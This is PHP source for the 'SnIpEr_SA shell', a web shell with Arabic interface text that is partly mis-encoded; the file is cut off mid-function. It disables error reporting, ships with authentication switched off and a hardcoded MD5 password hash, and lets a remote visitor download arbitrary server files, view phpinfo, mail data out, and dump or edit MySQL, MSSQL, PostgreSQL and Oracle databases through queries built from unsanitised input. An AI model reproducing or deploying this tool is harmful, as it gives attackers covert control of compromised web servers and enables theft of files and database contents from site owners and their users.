<?php
/******************************************************************************************************/
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
/*  (c)oded by SnIpEr_SA
/*  MAIL http://sniper-sa.com , http://sniper-sa.com
/******************************************************************************************************/
/* ~~~ «·ŒÌ«—«  | Options  ~~~ */
// «··€… | Language
// $language='eng' - english (english)
// $language='ar' - arabi (arabi)
$language='ar';
// ?????????????? | Authentification
// $auth = 1; - · ›⁄Ì· «·œŒÊ· »ﬂ·„Â «·„—Ê—  ( authentification = On  )
// $auth = 0; - ·«Ìﬁ«› «·œŒÊ· »ﬂ·„… «·„—Ê— ( authentification = Off )
$auth = 0;
// ·œŒÊ· »ﬂ·„… „—Ê— Ê«”„ „” Œœ„ (Login & Password for access)
// ·Õ„«Ì… «·”ﬂ—»  „‰ œŒÊ· €Ì—ﬂ €Ì— «· «·Ì!!! (CHANGE THIS!!!)
// Â‰« Ê÷⁄ﬂ ﬂ·„Â «·„—Ê— ÊÂÌ „‘›—Â »’Ì€Â md5, Êﬂ·„…⁄ «·„—Ê— Â‰« ÂÌ  'sniper'
//  ” ⁄ÿÌ⁄ «‰  ‘›— ﬂ·„… „—Ê—ﬂ Ê«”„ «·„” Œœ„ »’Ì€… md5 ÊÊ÷⁄Â« ›Ì «·Œ«‰«  «· «·ÌÂ
$name='1c27680133b781cadd037e8a6dcc001b'; // «”„ «·„” Œœ„  (user login)
$pass='1c27680133b781cadd037e8a6dcc001b'; // ﬂ·„… «·„—Ê— (user password)
/******************************************************************************************************/

echo "".htmlspecialchars($copy)."";
error_reporting(0);
set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$safe_mode = @ini_get('safe_mode');
$version = '1.31';
if(version_compare(phpversion(), '4.1.0') == -1)
 {
 $_POST   = &$HTTP_POST_VARS;
 $_GET    = &$HTTP_GET_VARS;
 $_SERVER = &$HTTP_SERVER_VARS;
 $_COOKIE = &$HTTP_COOKIE_VARS;
 }
if (@get_magic_quotes_gpc())
 {
 foreach ($_POST as $k=>$v)
  {
  $_POST[$k] = stripslashes($v);
  }
 foreach ($_COOKIE as $k=>$v)
  {
  $_COOKIE[$k] = stripslashes($v);
  }
 }

if($auth == 1) {
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
   {
   header('WWW-Authenticate: Basic realm="SnIpEr_SA shell"');
   header('HTTP/1.0 401 Unauthorized');
   exit("<b><a href=http://sniper-sa.com>SnIpEr_SA</a> : Access Denied</b>");
   }
}
$head = '<!-- SnIpEr_SA -->
<html>
<head>
<meta http-equiv="Content-Language" content="ar-sa">
<meta name="GENERATOR" content="Microsoft FrontPage 6.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1256">
<title>SnIpEr_SA shell</title>



<STYLE>

BODY
 {
        SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #000000; COLOR: #ffffff; SCROLLBAR-3DLIGHT-COLOR: #726456; SCROLLBAR-ARROW-COLOR: #726456; SCROLLBAR-TRACK-COLOR: #292929; FONT-FAMILY: Verdana; SCROLLBAR-DARKSHADOW-COLOR: #726456
}

tr {
BORDER-RIGHT:  #cccccc ;
BORDER-TOP:    #cccccc ;
BORDER-LEFT:   #cccccc ;
BORDER-BOTTOM: #cccccc ;
color: #ffffff;
}
td {
BORDER-RIGHT:  #cccccc ;
BORDER-TOP:    #cccccc ;
BORDER-LEFT:   #cccccc ;
BORDER-BOTTOM: #cccccc ;
color: #cccccc;
}
.table1 {
BORDER: 1;
BACKGROUND-COLOR: #000000;
color: #333333;
}
.td1 {
BORDER: 1;
font: 7pt tahoma;
color: #ffffff;
}
.tr1 {
BORDER: 1;
color: #cccccc;
}
table {
BORDER:  #eeeeee  outset;
BACKGROUND-COLOR: #000000;
color: #cccccc;
}
input {
BORDER-RIGHT:  #990000 1 solid;
BORDER-TOP:    #990000 1 solid;
BORDER-LEFT:   #990000 1 solid;
BORDER-BOTTOM: #990000 1 solid;
BACKGROUND-COLOR: #333333;
font: 9pt tahoma;
color: #ffffff;
}
select {
BORDER-RIGHT:  #ffffff 1 solid;
BORDER-TOP:    #999999 1 solid;
BORDER-LEFT:   #999999 1 solid;
BORDER-BOTTOM: #ffffff 1 solid;
BACKGROUND-COLOR: #000000;
font: 9pt tahoma;
color: #CCCCCC;;
}
submit {
BORDER:  buttonhighlight 1 outset;
BACKGROUND-COLOR: #272727;
width: 40%;
color: #cccccc;
}
textarea {
BORDER-RIGHT:  #ffffff 1 solid;
BORDER-TOP:    #999999 1 solid;
BORDER-LEFT:   #999999 1 solid;
BORDER-BOTTOM: #ffffff 1 solid;
BACKGROUND-COLOR: #333333;
font: Fixedsys bold;
color: #ffffff;
}
BODY {
margin: 1;
color: #cccccc;
background-color: #000000;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}

</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
  document.getElementById(id).style.display = \'none\';
  document.cookie=id+\'=0;\';
}
function show_div(id)
{
  document.getElementById(id).style.display = \'block\';
  document.cookie=id+\'=1;\';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == \'none\')
    show_div(id);
  else
    hide_div(id);
}
</script>';
class zipfile
{
    var $datasec      = array();
    var $ctrl_dir     = array();
    var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
    var $old_offset   = 0;
    function unix2DosTime($unixtime = 0) {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
        if ($timearray['year'] < 1980) {
            $timearray['year']    = 1980;
            $timearray['mon']     = 1;
            $timearray['mday']    = 1;
            $timearray['hours']   = 0;
            $timearray['minutes'] = 0;
            $timearray['seconds'] = 0;
        }
        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
                ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    }
    function addFile($data, $name, $time = 0)
    {
        $name     = str_replace('\\', '/', $name);
        $dtime    = dechex($this->unix2DosTime($time));
        $hexdtime = '\x' . $dtime[6] . $dtime[7]
                  . '\x' . $dtime[4] . $dtime[5]
                  . '\x' . $dtime[2] . $dtime[3]
                  . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');
        $fr   = "\x50\x4b\x03\x04";
        $fr   .= "\x14\x00";
        $fr   .= "\x00\x00";
        $fr   .= "\x08\x00";
        $fr   .= $hexdtime;
        $unc_len = strlen($data);
        $crc     = crc32($data);
        $zdata   = gzcompress($data);
        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $c_len   = strlen($zdata);
        $fr      .= pack('V', $crc);
        $fr      .= pack('V', $c_len);
        $fr      .= pack('V', $unc_len);
        $fr      .= pack('v', strlen($name));
        $fr      .= pack('v', 0);
        $fr      .= $name;
        $fr .= $zdata;
        $this -> datasec[] = $fr;
        $cdrec = "\x50\x4b\x01\x02";
        $cdrec .= "\x00\x00";
        $cdrec .= "\x14\x00";
        $cdrec .= "\x00\x00";
        $cdrec .= "\x08\x00";
        $cdrec .= $hexdtime;
        $cdrec .= pack('V', $crc);
        $cdrec .= pack('V', $c_len);
        $cdrec .= pack('V', $unc_len);
        $cdrec .= pack('v', strlen($name) );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('V', 32 );
        $cdrec .= pack('V', $this -> old_offset );
        $this -> old_offset += strlen($fr);
        $cdrec .= $name;
        $this -> ctrl_dir[] = $cdrec;
    }
    function file()
    {
        $data    = implode('', $this -> datasec);
        $ctrldir = implode('', $this -> ctrl_dir);
        return
            $data .
            $ctrldir .
            $this -> eof_ctrl_dir .
            pack('v', sizeof($this -> ctrl_dir)) .
            pack('v', sizeof($this -> ctrl_dir)) .
            pack('V', strlen($ctrldir)) .
            pack('V', strlen($data)) .
            "\x00\x00";
    }
}
function compress(&$filename,&$filedump,$compress)
 {
    global $content_encoding;
    global $mime_type;
    if ($compress == 'bzip' && @function_exists('bzcompress'))
     {
        $filename  .= '.bz2';
        $mime_type = 'application/x-bzip2';
        $filedump = bzcompress($filedump);
     }
     else if ($compress == 'gzip' && @function_exists('gzencode'))
     {
        $filename  .= '.gz';
        $content_encoding = 'x-gzip';
        $mime_type = 'application/x-gzip';
        $filedump = gzencode($filedump);
     }
     else if ($compress == 'zip' && @function_exists('gzcompress'))
     {
             $filename .= '.zip';
        $mime_type = 'application/zip';
        $zipfile = new zipfile();
        $zipfile -> addFile($filedump, substr($filename, 0, -4));
        $filedump = $zipfile -> file();
     }
     else
     {
             $mime_type = 'application/octet-stream';
     }
 }
function mailattach($to,$from,$subj,$attach)
 {
 $headers  = "From: $from\r\n";
 $headers .= "MIME-Version: 1.0\r\n";
 $headers .= "Content-Type: ".$attach['type'];
 $headers .= "; name=\"".$attach['name']."\"\r\n";
 $headers .= "Content-Transfer-Encoding: base64\r\n\r\n";
 $headers .= chunk_split(base64_encode($attach['content']))."\r\n";
 if(@mail($to,$subj,"",$headers)) { return 1; }
 return 0;
 }
class my_sql
 {
 var $host = 'localhost';
 var $port = '';
 var $user = '';
 var $pass = '';
 var $base = '';
 var $db   = '';
 var $connection;
 var $res;
 var $error;
 var $rows;
 var $columns;
 var $num_rows;
 var $num_fields;
 var $dump;

 function connect()
  {
          switch($this->db)
     {
           case 'MySQL':
            if(empty($this->port)) { $this->port = '3306'; }
            if(!function_exists('mysql_connect')) return 0;
            $this->connection = @mysql_connect($this->host.':'.$this->port,$this->user,$this->pass);
            if(is_resource($this->connection)) return 1;
           break;
     case 'MSSQL':
      if(empty($this->port)) { $this->port = '1433'; }
            if(!function_exists('mssql_connect')) return 0;
            $this->connection = @mssql_connect($this->host.','.$this->port,$this->user,$this->pass);
      if($this->connection) return 1;
     break;
     case 'PostgreSQL':
      if(empty($this->port)) { $this->port = '5432'; }
      $str = "host='".$this->host."' port='".$this->port."' user='".$this->user."' password='".$this->pass."' dbname='".$this->base."'";
      if(!function_exists('pg_connect')) return 0;
      $this->connection = @pg_connect($str);
      if(is_resource($this->connection)) return 1;
     break;
     case 'Oracle':
      if(!function_exists('ocilogon')) return 0;
      $this->connection = @ocilogon($this->user, $this->pass, $this->base);
      if(is_resource($this->connection)) return 1;
     break;
     }
    return 0;
  }

 function select_db()
  {
   switch($this->db)
    {
          case 'MySQL':
           if(@mysql_select_db($this->base,$this->connection)) return 1;
    break;
    case 'MSSQL':
           if(@mssql_select_db($this->base,$this->connection)) return 1;
    break;
    case 'PostgreSQL':
     return 1;
    break;
    case 'Oracle':
     return 1;
    break;
    }
   return 0;
  }

 function query($query)
  {
   $this->res=$this->error='';
   switch($this->db)
    {
          case 'MySQL':
     if(false===($this->res=@mysql_query('/*'.chr(0).'*/'.$query,$this->connection)))
      {
      $this->error = @mysql_error($this->connection);
      return 0;
      }
     else if(is_resource($this->res)) { return 1; }
     return 2;
          break;
    case 'MSSQL':
     if(false===($this->res=@mssql_query($query,$this->connection)))
      {
      $this->error = 'Query error';
      return 0;
      }
      else if(@mssql_num_rows($this->res) > 0) { return 1; }
     return 2;
    break;
    case 'PostgreSQL':
     if(false===($this->res=@pg_query($this->connection,$query)))
      {
      $this->error = @pg_last_error($this->connection);
      return 0;
      }
      else if(@pg_num_rows($this->res) > 0) { return 1; }
     return 2;
    break;
    case 'Oracle':
     if(false===($this->res=@ociparse($this->connection,$query)))
      {
      $this->error = 'Query parse error';
      }
     else
      {
      if(@ociexecute($this->res))
       {
       if(@ocirowcount($this->res) != 0) return 2;
       return 1;
       }
      $error = @ocierror();
      $this->error=$error['message'];
      }
    break;
    }
  return 0;
  }
 function get_result()
  {
   $this->rows=array();
   $this->columns=array();
   $this->num_rows=$this->num_fields=0;
   switch($this->db)
    {
          case 'MySQL':
           $this->num_rows=@mysql_num_rows($this->res);
           $this->num_fields=@mysql_num_fields($this->res);
           while(false !== ($this->rows[] = @mysql_fetch_assoc($this->res)));
           @mysql_free_result($this->res);
           if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
    break;
    case 'MSSQL':
           $this->num_rows=@mssql_num_rows($this->res);
           $this->num_fields=@mssql_num_fields($this->res);
           while(false !== ($this->rows[] = @mssql_fetch_assoc($this->res)));
           @mssql_free_result($this->res);
           if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;};
    break;
    case 'PostgreSQL':
           $this->num_rows=@pg_num_rows($this->res);
           $this->num_fields=@pg_num_fields($this->res);
           while(false !== ($this->rows[] = @pg_fetch_assoc($this->res)));
           @pg_free_result($this->res);
           if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
    break;
    case 'Oracle':
     $this->num_fields=@ocinumcols($this->res);
     while(false !== ($this->rows[] = @oci_fetch_assoc($this->res))) $this->num_rows++;
     @ocifreestatement($this->res);
     if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
    break;
    }
   return 0;
  }
 function dump($table)
  {
   if(empty($table)) return 0;
   $this->dump=array();
   $this->dump[0] = '##';
   $this->dump[1] = '## --------------------------------------- ';
   $this->dump[2] = '##  Created: '.date ("d/m/Y H:i:s");
   $this->dump[3] = '## Database: '.$this->base;
   $this->dump[4] = '##    Table: '.$table;
   $this->dump[5] = '## --------------------------------------- ';
   switch($this->db)
    {
          case 'MySQL':
           $this->dump[0] = '## MySQL dump';
           if($this->query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0;
           if(!$this->get_result()) return 0;
           $this->dump[] = $this->rows[0]['Create Table'];
     $this->dump[] = '## --------------------------------------- ';
           if($this->query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0;
           if(!$this->get_result()) return 0;
           for($i=0;$i<$this->num_rows;$i++)
            {
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @mysql_real_escape_string($v);}
            $this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this->columns).'`) VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
            }
    break;
    case 'MSSQL':
     $this->dump[0] = '## MSSQL dump';
     if($this->query('SELECT * FROM '.$table)!=1) return 0;
           if(!$this->get_result()) return 0;
           for($i=0;$i<$this->num_rows;$i++)
            {
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);}
            $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
            }
    break;
    case 'PostgreSQL':
     $this->dump[0] = '## PostgreSQL dump';
     if($this->query('SELECT * FROM '.$table)!=1) return 0;
           if(!$this->get_result()) return 0;
           for($i=0;$i<$this->num_rows;$i++)
            {
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);}
            $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
            }
    break;
    case 'Oracle':
      $this->dump[0] = '## ORACLE dump';
      $this->dump[]  = '## under construction';
    break;
    default:
     return 0;
    break;
    }
   return 1;
  }
 function close()
  {
   switch($this->db)
    {
          case 'MySQL':
           @mysql_close($this->connection);
    break;
    case 'MSSQL':
     @mssql_close($this->connection);
    break;
    case 'PostgreSQL':
     @pg_close($this->connection);
    break;
    case 'Oracle':
     @oci_close($this->connection);
    break;
    }
  }
 function affected_rows()
  {
   switch($this->db)
    {
          case 'MySQL':
           return @mysql_affected_rows($this->res);
    break;
    case 'MSSQL':
     return @mssql_affected_rows($this->res);
    break;
    case 'PostgreSQL':
     return @pg_affected_rows($this->res);
    break;
    case 'Oracle':
     return @ocirowcount($this->res);
    break;
    default:
     return 0;
    break;
    }
  }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="download_file" && !empty($_POST['d_name']))
 {
  if(!$file=@fopen($_POST['d_name'],"r")) { err(1,$_POST['d_name']); $_POST['cmd']=""; }
  else
   {
    @ob_clean();
    $filename = @basename($_POST['d_name']);
    $filedump = @fread($file,@filesize($_POST['d_name']));
    fclose($file);
    $content_encoding=$mime_type='';
    compress($filename,$filedump,$_POST['compress']);
    if (!empty($content_encoding)) { header('Content-Encoding: ' . $content_encoding); }
    header("Content-type: ".$mime_type);
    header("Content-disposition: attachment; filename=\"".$filename."\";");
    echo $filedump;
    exit();
   }
 }

if(isset($_GET['phpinfo'])) { echo @phpinfo(); echo "<br><div align=center><font face=tahoma size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }
if(isset($_GET['sqlman'])) {
session_start();
$action = $HTTP_GET_VARS['action'];
$pagemax=20; // Maximum rows displaed per page, change to display more or less rows per page.
function show_login($dbnamearray){
     $hostdefault="localhost";
                echo"<table>";
                echo"<form  name='showlogin' method='post' action='$action'>";
        if(count($hostdefault) > 1){
            echo"<tr><td>??? C???????:</td><td><select name=host>";
            for($x=0; $x < count($hostdefault);$x++){
                echo"<option value=$hostdefault[$x]>$hostdefault[$x]";
            }
            echo"</select></td></tr>\n";
        }else{
            echo"<tr><td>”Ì—›— ﬁÊ«⁄œ «·»Ì«‰« :</td><td><input type=text name='host' size=15 value=$hostdefault /></td></tr>\n";
                }
        echo"<tr><td>«”„ «·„” Œœ„:</td><td><input type=text name='userid' size=15 /></td></tr>\n";
                echo"<tr><td>ﬂ·„Â «·„—Ê—:</td><td><input type=password name='pword1' size=15 /></td></tr>\n";

                If($dbnamearray != ""){
                        echo"<tr><td>?C?IE C?E?C?CE:</td><td><select name='dbna'>\n";
                        for ($i =0; $i < count($dbnamearray); $i++) {
                                $dbn=$dbnamearray[$i];
                                echo"<option value=$dbn>$dbn";
                        }
                }
                echo"<tr><td><input class=ser type='submit' name='login' value='œŒÊ·' /></td>\n";
                echo"<td><input class=ser type=reset name='reset' value='„”Õ' /></td></tr>\n";
                echo"</form></table>\n";

}

function dbrestrict(){
if(isset($_SESSION['user'])){
    $user=$_SESSION['user'];

    switch($user){

    //Edit these ** values. You can add more case statements.
        case '**User**':
            $dbnamearray= array('**dbname**', '**dbname2**', '**dbname**');
            break;
     //end edit values

        default:
            $_SESSION['defaltuser']=true;
            $dbnamearray = array();
            $link = connectmysql();

            $db_list = mysql_list_dbs($link); //$db_list
                    $cnt = mysql_num_rows($db_list);
                    for ($i =0; $i < $cnt; $i++) {
                            $dbnamearray[$i]= mysql_db_name($db_list, $i);
                    }
    }
    return $dbnamearray;
}
}
//***************************************************************
//function showdbs($dbnamearray, $backuppath){
function showdbs($dbnamearray){
    //$backuppath=addslashes($backuppath);
       echo"<table>\n";
       for ($i =0; $i < count($dbnamearray); $i++) {
                    echo"<tr><td>";
            $dbn=$dbnamearray[$i];
                        $va="«·–Â«» «·Ï ﬁ«⁄œ… $dbn";
                        goto(' ', $dbn,$action, 'but', 'db', $va );

            $dbs=mysize($dbnamearray[$i],"");
            echo"</td><td>$dbs</td></tr>\n";
        }
    echo"</table>\n";
}


//********************* Show Logout Button **********
function endsess(){
echo"<form method='post' name='endsess' action='$action'>\n";
echo"<input class=ser type='submit' name='logout' value='Œ—ÊÃ' />\n";
echo"</form>";
}

//********************************************************************
function connectmysql(){
        //Connects to the MySQL Database.


        if (isset($_SESSION['user']) && isset($_SESSION['password'])){
                 $user = $_SESSION['user'];
                 $pass = $_SESSION['password'];
        }else{
        display_foot();
        echo"\n</body>\n</html>";
                exit();
        }
        $link = @mysql_connect($_SESSION['host'], $_SESSION['user'], $_SESSION['password']);
        if(! $link){
                echo"<div class='error'>\n";
                echo"Unable to connect to the database server. <BR>";
                echo"The Host: $_SESSION[host], «”„ «·„” Œœ„: $user «Ê «·ﬂ·„Â «·”—ÌÂ Œÿ«¡. <br>";
                echo"›÷·« ”Ã· Œ—ÊÃ ··„Õ«Ê·Â „—Â «Œ—Ï.\n";
                echo"</div>\n";

        return false;
                exit();
        } else{
                return $link;
        }

}
//*********************************************************************
function connectdb($db, $link){
        if(! mysql_select_db($db,$link)){
                echo"Unable to locate database $db.<br> Please try again later.\n";
                exit();
        }
}
//*********************************************************************
function exequery($sql, $tablename, $db){
        $result= @mysql_query( $sql );
        if($result){
                //echo "Query successful";
                return $result;
        }else{
                echo"Sorry your Query failed: $sql <br> error:".mysql_error()."\n";
                return false;
        }
}


//***************************************************
$fieldtypes = array("BIGINT", "BLOB", "CHAR", "DATE", "DATETIME", "DECIMAL", "DOUBLE", "ENUM", "FLOAT",
  "INT", "INTEGER", "LONGBLOB", "LONGTEXT", "MEDIUMBLOB", "MEDIUMINT", "MEDIUMTEXT", "NUMERIC", "PRECISION",
 "REAL","SET", "SMALLINT", "TEXT", "TIME", "TIMESTAMP", "TINYBLOB", "TINYINT", "TINYTEXT", "VARCHAR", "YEAR" );


//****************** Search Form ****************************
function searchtableform($tablename, $dbname){
        echo"<form method='post' action='$action'>\n";
        echo"<input type=hidden name='dbname' value='$dbname' />\n";
        echo"<input type=hidden name='tablename' value='$tablename' />\n";
        echo"<input type=text name='searchval' />\n";
        echo"<input class=ser type=submit name='search' value='Search $tablename' />\n";
        echo"</form>\n";
}
//********************* Search *************************
function searcht($tablename, $dbname, $searchval){
        if(! empty($searchval)){
                //        $searchval= str_replace(";",' ', $searchval);
        $result=exequery("Select * from $tablename", $tablename, $dbname);
                //$result=mysql_query("Select * from $tablename");
                $num = mysql_num_fields($result);
                $fields = mysql_list_fields($dbname, $tablename);
                $whr="where ";
                $tok=explode(" ",$searchval);
                for ($t =0; $t < count($tok); $t++){
                        for ( $c = 0; $c < $num; $c++){
                                $fn =mysql_field_name($fields, $c);
                                $whr .=" $fn like '%$tok[$t]%' or ";
                        }
                }
                $whr=trim(substr_replace($whr, " ", -3));
                $query="Select * from $tablename $whr";
                $result=exequery($query, $tablename, $dbname);
                return $result;
        }

}
//*********************GOTO buttons*************************
//provides a form and button.

function goto($tablename, $dbname, $action, $class, $name, $va ){
        //Adds a button.

        echo"<form action='$action' method='post' >\n";

                if(! eregi('tablestart', $name)){
                        echo"<input type=hidden name=dbname value='$dbname' />\n";
                        echo"<input type=hidden name=tablename value='$tablename' />\n";
                }
                echo"<input class=$class type=submit  value='$va' name='$name' />\n";
                //echo"<input class=$class type=submit  value='$action' name=$name>";
        echo"</form>\n";

        //echo"<a class=$class href=$action>$va</a>";
        //}
}

//*********************** ShowDB ***********************************
function showdb(){
//function showdb($backuppath){

        $link=connectmysql();
        if ($link){
        echo"<div class='db'>";
                echo"<div class='cream'>\n";
                echo"<h2 class=h >≈‰‘«¡ ﬁ«⁄œ… ÃœÌœ…</h2>\n";

                echo"<form name=cdb action='$action' method='post' >\n";
                echo"√”„ «·ﬁ«⁄œ… «·ÃœÌœ…: <input type=text name=ndbname />\n";
                echo"<br /><br /><input class=but type='submit' name='cndb' value='≈‰‘«¡ ﬁ«⁄œ… ÃœÌœ…' />\n";
                echo"</form><br />";
                echo"</div>";
                echo"<h2 class=h >ﬁ«∆„Â «·ﬁÊ«⁄œ «·„ Ê›—Â</h2>\n";
                //Restrict the database for users
        $dbnamearray= dbrestrict();
        showdbs($dbnamearray);
        echo"</div>";
           }

}

//********************** BuildWhr ******************************
//Builds the Where part of queries.

function buildwhr($pk, $pv){
        $whr="";
        $pn =count($pv);
        for($t =0; $t < $pn; $t++){
                $whr.="$pk[$t]='$pv[$t]'";
                if($t < $pn-1){
                        $whr.=" and ";
                }
        }
        if ($whr !=" "){
                return $whr;
        }else{
                return false;
        }
}
//***********************ADD Record ******************

function addrecord($tablename, $dbname, $array){
     $result=exequery("Select * from $tablename", $tablename, $dbname);
        //$result = @mysql_query( "Select * from $tablename" );

        $flds = mysql_num_fields($result);
        //$fields = mysql_list_fields($dbname, $tablename);
           $qry=" ";
    $query = "Insert into $tablename Values( ";
        for ($x =0; $x < $flds; $x++){
        //Multiple Select values for SET

       if(is_array($array[$x])){
            $mval="";
            for($m=0; $m < count($array[$x]); $m++){
                if($m+1 == count($array[$x])){
                    $mval.= AddSlashes($array[$x][$m]);

                }else{
                    $mval.= AddSlashes($array[$x][$m]).",";
                }
                $fval = $mval;
            }
        }else{
                    $fval = AddSlashes($array[$x]);
        }
                $qry .= "'$fval'";
                if ($x < $flds-1){
                        $qry.= ", ";
                }
        }
        $query .= $qry.")";
   // echo"qry: $qry";
        $result=exequery($query, $tablename, $dbname);
        if($result){
                return $result;
        }else{
                return false;
        }
}

//**********************ADD Form **********************

function addform($tablename, $dbname){
 //Display the field names and input boxes
 echo"<form action='$action' method='post'>\n";
 echo"<table border=0 width='100%' align='center'>\n";
 echo"<tr class=head><td>Field Name</td><td>Type</td><td>Value</td></tr>\n";
  $result=exequery("Select * from $tablename", $tablename, $dbname);
 //$result = @mysql_query( "Select * from $tablename" );
 $flds = mysql_num_fields($result);
 $fields = mysql_list_fields($dbname, $tablename);
 echo"<input type=hidden name=tablename value='$tablename' />\n";
 echo"<input type=hidden name='dbname' value='$dbname' />\n";
 echo"<tr>\n";

 $mxlen = 80;//max width of the form fields.
 for($i=0; $i < $flds; $i++){
      $auto = "false";
      echo "<th>".mysql_field_name($fields, $i);
      $fieldname = mysql_field_name($fields, $i);  // added
      $type  = mysql_field_type($result, $i);
      $flen = mysql_field_len($result, $i);//length of the field
      $flagstring = mysql_field_flags ($result, $i);
    // Start of new code for set drop down
      $newsql = "show columns from $tablename like '%".$fieldname."'";
      $newresult = exequery($newsql, $tablename, $dbname);
      //mysql_query($newsql) or die ('I cannot get the query because: ' . mysql_error());
      $arr=mysql_fetch_array($newresult);
    // End of new code block for set drop down
      if (eregi("primary",$flagstring )){
       $type .= " PK ";
      }
      if(eregi("auto",$flagstring )){
       $type .= " auto_increment";
       $auto = "true";
      }
      if ($auto=="true"){
        echo"<td>$type</td><td><input type=text name='array[$i]' size='$flen' value=0 /></td></tr>\n";
      }elseif($flen > $mxlen){
        $rws= $flen/$mxlen;
        if($rws>10){
             $rws=10; //max length of textarea
        }
        echo"<td>$type</td><td><textarea name='array[$i]' rows=$rws cols=$mxlen></textarea></td></tr>\n";
        // Start of new code for set drop down
      }elseif (strncmp($arr[1],'set',3)==0 || strncmp($arr[1],'enum',4)==0){  // We have a field type of set or enum
       $num=substr_count($arr[1],',') + 1;  // count the number of entries
       $pos=strpos($arr[1],'(' ); //find the position of '('
       $newstring=substr($arr[1],$pos+1);  // get rid of the '???('
       $snewstring=str_replace(')','',$newstring); // get rid of the last ')'
       $nnewstring=explode(',',$snewstring,$num); // stick into an array
       if(strncmp($arr[1],'set',3)==0 ){//Sets can have combinations of values
           echo "<td>Set (select one or more)</td>";
           echo"<td><select name='array[$i][]' size='3' multiple>";
       }else{//Enum one value only
        echo "<td>Enum</td>";
           echo"<td><select name='array[$i]'>";
       }
       for($y=0; $y<$num;$y++){
       echo"<option value=$nnewstring[$y]>$nnewstring[$y]";
       }
        echo"</select></td></tr>\n";
    // End of new code block for set drop down
      }else{
       echo"<td>$type</td><td><input type=text name='array[$i]' size='$flen' /></td></tr>\n";
      }
 }
 echo"<tr><td><input class=but type=submit name='addrec' value='Add Record' /></td>\n";
 echo"<td><input class=but type=reset name='reset' value='Reset Form' /></td>\n";
 echo"</tr>";
 echo"</table>\n";
 echo"</form>\n";
}


//*********************Edit Form ***************
function editform($tablename, $dbname, $result, $edit, $pk, $pv){
        $row=mysql_fetch_array($result);
        echo"<form action='$action'  method=post>\n";
        echo"<table border=0 width ='100%' align='center'>\n";

        $flds = mysql_num_fields($result);
        $fields = mysql_list_fields($dbname, $tablename);
        echo"<input type=hidden name=tablename value='$tablename' />\n";

        echo"<input type=hidden name='dbname' value='$dbname' />\n";
        echo"<tr>";
        $mxlen = 80;//max width of the form fields
        for($i=0; $i < $flds; $i++){
        $fname=mysql_field_name($fields, $i);
                echo "<th>$fname";
                 $flen = mysql_field_len($result, $i);//length of the field
                $nslash = StripSlashes($row[$i]);
        // Start of new code for set drop down
      $newsql = "show columns from $tablename like '%".$fname."'";
      $newresult = exequery($newsql, $tablename, $dbname);
      $arr=mysql_fetch_array($newresult);
    // End of new code block for set drop down

                if($flen > $mxlen){
                        $rws= $flen/$mxlen;
                                if($rws>10){
                                $rws=10; //max length of textarea
                        }
                        echo"<td><textarea name='array[$i]' rows=$rws cols=$mxlen>$nslash</textarea></td></tr>\n";
// Start of new code for set drop down
          }elseif (strncmp($arr[1],'set',3)==0 || strncmp($arr[1],'enum',4)==0){  // We have a field type of set or enum
           $num=substr_count($arr[1],',') + 1;  // count the number of entries
           $pos=strpos($arr[1],'(' ); //find the position of '('
           $newstring=substr($arr[1],$pos+1);  // get rid of the '???('
           $snewstring=str_replace(')','',$newstring); // get rid of the last ')'
           $nnewstring=explode(',',$snewstring,$num); // stick into an array
           if(strncmp($arr[1],'set',3)==0 ){//Sets can have combinations of values
               echo"<td><select name='array[$i][]' multiple size='3'>";
           }else{//Enum one value only
               echo"<td><select name='array[$i]'>";
           }
           $nsel=explode(",",$nslash);
          for($y=0; $y<$num;$y++){
                //geteach value 'a,b,c'
                $sel="";
                for($e=0; $e<count($nsel);$e++){
                    if($nnewstring[$y]=="'".$nsel[$e]."'"){
                        $sel="selected";
                    }
                }
                echo"<option value=$nnewstring[$y] $sel>$nnewstring[$y]";
           }
